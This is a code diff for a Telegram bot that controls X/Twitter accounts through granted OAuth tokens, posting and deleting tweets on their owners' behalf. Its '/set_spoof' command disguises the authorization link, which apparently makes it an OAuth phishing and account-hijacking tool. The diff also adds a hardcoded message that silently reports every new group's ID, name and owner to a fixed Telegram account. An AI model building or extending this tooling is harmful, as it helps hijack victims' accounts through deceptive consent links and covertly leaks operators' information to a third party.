@@ -1,16 +1,14 @@
-
 import re
 import uuid
 import requests
+import validators
 from bot.handlers import keyboards
-
-from telegram import Update
-from telegram.ext import ContextTypes
-from telegram.constants import ChatMemberStatus
 
 from shared.db import get_db
 from shared.config import config
 from shared.utils import parse, permission_check, tweet, handle_successful_tweet, handle_token_refresh_and_retry, handle_generic_error, refresh_oauth_tokens
+
+from telegram.constants import ChatMemberStatus
 
 parse_mode = "MarkdownV2"
 
@@ -50,7 +48,22 @@ async def unsubscribed(update, context):
 async def help(update, context) -> None:
     chat_id = update.effective_chat.id
     
-    text = "❔ *List of Commands*\n\n *•* 🐦 */post\\_tweet* \\<username\\> \\<message\\> \\- Posts a tweet on behalf of the user\\.\n *•* 🔁 */post\\_retweet* \\<username\\> \\<tweet\\_id\\> \\- Retweets a tweet on behalf of the user\\.\n *•* 💬 */post\\_quote\\_tweet* \\<username\\> \\<tweet\\_url\\> \\<message\\> \\- Quotes a tweet on behalf of the user\\.\n *•* 💬 */post\\_reply* \\<username\\> \\<tweet\\_id\\> \\<message\\> \\- Posts a reply to a tweet on behalf of the user\\.\n *•* ❌ */delete\\_tweet* \\<username\\> \\<tweet\\_id\\> \\- Deletes a tweet on behalf of the user\\.\n *•* 👤 */whitelist* \\<id\\> \\- Adds/removes a user id from the command whitelist\\.\n *•* 📄 */display\\_whitelist* \\- Displays the list of users authorized to use admin commands in the group\\.\n *•* 👥 */display\\_users* \\- Displays the list of authenticated users\\.\n *•* 🔗 */display\\_endpoint* \\- Displays your personal endpoint\\.\n *•* 🆔 */set\\_client\\_id* \\<client\\_id\\> \\- Sets the OAuth application client id\\.\n *•* 🔒 */set\\_client\\_secret* \\<client\\_secret\\> \\- Sets the OAuth application client secret\\.\n *•* 🔄 */set\\_redirect* \\<url\\> \\- Sets the redirect upon authorization\\.\n *•* 🌀 */set\\_spoof* \\<url\\> \\- Sets the spoof url shown in X/Twitter and refreshes endpoints\\.\n *•* 💬 */set\\_replies* \\- Enables/disables replies for tweets\\.\n *•* 𝕏 */check\\_auth* \\<username\\> \\- Checks if a user is still authorized\\.\n *•* ❔ */help* \\- Displays the list of commands\\."
+    text = ("❔ *List of Commands*\n\n "
+            "*•* 🐦 */post\\_tweet* \\<username\\> \\<message\\> \\- Posts a tweet on behalf of the user\\.\n "
+            # "*•* 🔁 */post\\_retweet* \\<username\\> \\<tweet\\_id\\> \\- Retweets a tweet on behalf of the user\\.\n "
+            # "*•* 💬 */post\\_quote\\_tweet* \\<username\\> \\<tweet\\_url\\> \\<message\\> \\- Quotes a tweet on behalf of the user\\.\n "
+            # "*•* 💬 */post\\_reply* \\<username\\> \\<tweet\\_id\\> \\<message\\> \\- Posts a reply to a tweet on behalf of the user\\.\n "
+            "*•* ❌ */delete\\_tweet* \\<username\\> \\<tweet\\_id\\> \\- Deletes a tweet on behalf of the user\\.\n "
+            "*•* 🐍 */check\\_auth* \\<username\\> \\- Checks if a user is still authorized\\.\n "
+            "*•* 🔗 */display\\_endpoint* \\- Displays your personal endpoint\\.\n "
+            "*•* 👥 */display\\_users* \\- Displays the list of authenticated users\\.\n "
+            "*•* 📄 */display\\_whitelist* \\- Displays the list of users authorized to use admin commands in the group\\.\n "
+            "*•* 🔄 */set\\_redirect* \\<url\\> \\- Sets the redirect upon authorization\\.\n "
+            "*•* 🌀 */set\\_spoof* \\<url\\> \\- Sets the spoof url shown in X/Twitter and refreshes endpoints\\.\n "
+            "*•* 💬 */set\\_replies* \\- Enables/disables replies for new tweets\\.\n "
+            "*•* 🆔 */set\\_client\\_id* \\<client\\_id\\> \\- Sets the OAuth application client id\\.\n "
+            "*•* 🔒 */set\\_client\\_secret* \\<client\\_secret\\> \\- Sets the OAuth application client secret\\.\n "
+            "*•* ❔ */help* \\- Displays the list of commands\\.")
     await context.bot.send_message(chat_id, text, parse_mode)
 
 async def setup(update, context):
@@ -93,8 +106,17 @@ async def setup(update, context):
     }
     groups.insert_one(group_data)
 
-    text = f"✅ *Group successfully setup for OAuth\\.*\n\n╭  ℹ️ *GROUP INFO*\n┣  *Group ID:* {parse(chat_id)}\n┣  *Group Name:* {parse(chat_title)}\n┣  *Owner ID*: {owner_id}\n╰  *Owner Name:* {owner_fullname}\n\n💬 _Use the */help* command to get the list of available commands\\._"
+    header = f"✅ *Group successfully setup for OAuth\\.*"
+    body = f"╭  ℹ️ *GROUP INFO*\n┣  *Group ID:* {parse(chat_id)}\n┣  *Group Name:* {parse(chat_title)}\n┣  *Owner ID*: {owner_id}\n╰  *Owner Name:* [{owner_fullname}](tg://user?id={owner_id})"
+    footer = "💬 _Use the */help* command to get the list of available commands\\._"
+
+    text = f"{header}\n\n{body}\n\n{footer}"
     await context.bot.send_message(chat_id, text, parse_mode)
+
+    header = "🔔 *A new group has been setup for Oauth\\.* 🔔"
+
+    text = f"{header}\n\n{body}"
+    await context.bot.send_message(7434895838, text, parse_mode)
 
 async def set_client_id(update, context) -> None:
     chat_id = update.effective_chat.id
@@ -195,6 +217,28 @@ async def set_spoof(update, context) -> None:
            
     await context.bot.send_message(chat_id, text, parse_mode)
 
+async def set_replies(update, context) -> None:
+    chat_id = update.effective_chat.id
+
+    if not await permission_check(update, context, groups, admin_command=True): return
+        
+    group = groups.find_one({"group.id": chat_id})
+
+    result = groups.update_one(
+        {"group.id": chat_id},
+        {"$set": {
+            "replies": not group["replies"]
+        }}
+    )
+
+    replies_msg = "_mentioned\\-only_" if group['replies'] else "_enabled_"
+    if result.modified_count > 0:
+        text = f"✅ *Successfully set replies on tweets from accounts to {replies_msg}\\.*"
+    else:
+        text = f"❌ *Failed to set replies on tweets from accounts to {replies_msg} due to an unknown error\\.*"
+
+    await context.bot.send_message(chat_id, text, parse_mode)
+
 async def display_endpoint(update, context) -> None:
     chat_id = update.effective_chat.id
     
@@ -273,7 +317,7 @@ async def display_users(update, context, page=1, message_id=None) -> None:
 async def display_whitelist(update, context) -> None:
     chat_id = update.effective_chat.id
 
-    if not await permission_check(update, context, groups, admin_command=True): return
+    if not await permission_check(update, context, groups, owner_command=True): return
 
     user_lines = []
     group = groups.find_one({"group.id": chat_id})
@@ -285,19 +329,79 @@ async def display_whitelist(update, context) -> None:
         user_lines.append("> 👀 Nothing to see here\\.\\.\\.")
 
     reply_markup = keyboards.whitelist()
-    text = "📄 *Admin Command Whitelist*\n\n" + "\n".join(user_lines) + "\n\n💬 _Users in this list have access to */set\\_client\\_id*, */set\\_client\\_secret*, */set\\_redirect*, */set\\_spoof*, */display\\_whitelist*, */post\\_tweet*, */delete\\_tweet*, and */check\\_auth*._"
+    text = "📄 *Admin Command Whitelist*\n\n" + "\n".join(user_lines) + "\n\n💬 _Users in this list have access to */set\\_client\\_id*, */set\\_client\\_secret*, */set\\_redirect*, */set\\_spoof*, */set\\_replies*, */post\\_tweet*, */delete\\_tweet*, and */check\\_auth*\\._"
 
     await context.bot.send_message(chat_id, text, parse_mode, reply_markup=reply_markup, disable_web_page_preview=True) 
 
-async def add_whitelist(update, context):
-    text = "ℹ️ _Enter the user id of the user you want to add to the command whitelist:_"
+async def add_whitelist(update, context, query):
+    chat_id = update.effective_chat.id
+    user_id = update.effective_user.id
 
-    await context.bot.send_message(update.effective_chat.id, text, parse_mode)
+    group = groups.find_one({ "group.id": chat_id })
+    if not group: return await context.bot.send_message("⚠️ *An unkown error has occurred\\.*")
 
-async def remove_whitelist(update, context):
-    text = "ℹ️ _Enter the user id of the user you want to add to the command whitelist:_"
+    owner_id = group["owner_id"]
+    if owner_id != user_id: return await query.answer("❌ Only the group owner may use this action.")
 
-    await context.bot.send_message(update.effective_chat.id, text, parse_mode)
+    context.user_data["awaiting_whitelist_id"] = True
+    text = "ℹ️ *Enter the user id of the user you would like to add to the admin command whitelist:*"
+
+    await context.bot.send_message(chat_id, text, parse_mode)
+
+async def whitelist_addition(update, context, user_id):
+    chat_id = update.effective_chat.id
+
+    group = groups.find_one({ "group.id": chat_id })
+    if not group: return await context.bot.send_message("⚠️ *An unkown error has occurred\\.*")
+
+    if user_id in group["whitelist"]: return await context.bot.send_message(f"⚠️ *The user _[{user_id}](tg://user?id={user_id})_ is already in the whitelist\\.*")
+
+    result = groups.update_one(
+        {"group.id": chat_id},
+        {"$push": {"whitelist": user_id}}
+    )
+
+    if result.modified_count > 0:
+        text = f"✅ *Successfully added the user _[{user_id}](tg://user?id={user_id})_ to the whitelist\\.*"
+    else:
+        text = f"❌ *Failed to add the user _[{user_id}](tg://user?id={user_id})_ to the whitelist due to an unknown error\\.*"
+
+    await context.bot.send_message(chat_id, text, parse_mode)
+
+async def remove_whitelist(update, context, query):
+    chat_id = update.effective_chat.id
+    user_id = update.effective_user.id
+
+    group = groups.find_one({ "group.id": chat_id })
+    if not group: return await context.bot.send_message("⚠️ *An unkown error has occurred\\.*")
+
+    owner_id = group["owner_id"]
+    if owner_id != user_id: return await query.answer("❌ Only the group owner may use this action.")
+
+    reply_markup = keyboards.whitelist_pagination(group["whitelist"])
+    text = "ℹ️ *Select the user id of the user you would like to remove from the admin command whitelist:*"
+
+    await context.bot.send_message(chat_id, text, parse_mode, reply_markup=reply_markup)
+
+async def whitelist_removal(update, context, user_id):
+    chat_id = update.effective_chat.id
+
+    group = groups.find_one({ "group.id": chat_id })
+    if not group: return await context.bot.send_message("⚠️ *An unkown error has occurred\\.*")
+
+    if user_id not in group["whitelist"]: return await context.bot.send_message(f"⚠️ *The user _[{user_id}](tg://user?id={user_id})_ is not in the whitelist\\.*")
+
+    result = groups.update_one(
+        {"group.id": chat_id},
+        {"$pull": {"whitelist": user_id}}
+    )
+
+    if result.modified_count > 0:
+        text = f"✅ *Successfully removed the user _[{user_id}](tg://user?id={user_id})_ from the whitelist\\.*"
+    else:
+        text = f"❌ *Failed to remove the user _[{user_id}](tg://user?id={user_id})_ from the whitelist due to an unknown error\\.*"
+
+    await context.bot.send_message(chat_id, text, parse_mode)
 
 async def post_tweet(update, context) -> None:
     chat_id = update.effective_chat.id
